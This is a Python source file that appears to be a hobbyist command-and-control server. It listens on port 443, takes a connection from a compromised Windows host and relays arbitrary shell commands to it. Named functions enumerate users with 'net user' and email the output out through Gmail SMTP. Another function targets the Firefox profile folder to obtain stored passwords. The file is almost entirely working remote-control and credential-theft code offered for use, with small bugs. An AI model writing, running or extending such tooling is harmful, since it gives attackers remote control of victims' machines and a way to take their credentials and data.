#!/usr/bin/env python3
# This file should be executed in Linux, and this going to return a a c&c when this is listening and the other is responding as a user who receive the instructions from the user who execute this file.
import socket 
import signal
import sys
import smtplib
from termcolor import colored
from email.mime.text import MIMEText

def def_handler(signal, frame):
    print(colored("\n[!] Exiting...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Listener:

    def __init__(self, ip, port):
        self.options = {"get users": "List system valid users (Gmail)", "get firefox": "Get Firefox stored passwords", "help": "Show this help panel"}

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        print("\n[+] Listening for incoming conections...\n")

        self.client_socket, client_address = server_socket.accept()

        print(f"\n[+] Connection established: {client_address}\n")

    def execute_remotely(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(2048).decode()
    
    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = sender
        msg["To"] = ", ".join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(colored("\n[+] Email sent successfully", "green"))


    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.client_socket.recv(2048).decode()
        # use your own password application with your gmail
        self.send_email("User List Info - c2", output_command, "youremail@gmail.com", ["youremail@gmail.com"], "aaaa bbbb cccc dddd")

    def show_help(self):
        for key, value in self.options.items():
            print(f"\n{key}: {value}\n")
    
    # change the user´s name 
    def get_firefox_passwords(self):
        self.client_socket.send("C:\\Users\\[YOUR_USER]\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
        output_command = self.client_socket.recv(2048).decode()

        print(output_command)

    def run(self):
        while True:
            command = input(">> ")

            if command == "get user":
                self.get_users()
            elif command == "get firefox":
                self.get_firefox_passwords()
            elif command == "help":
                self.show_help()
            else:
                command_output = self.execute_remotely(command)
                print(command_output)

if __name__ == '__main__':
    my_listener = Listener("192.168.100.x", 443)
    my_listener.run()
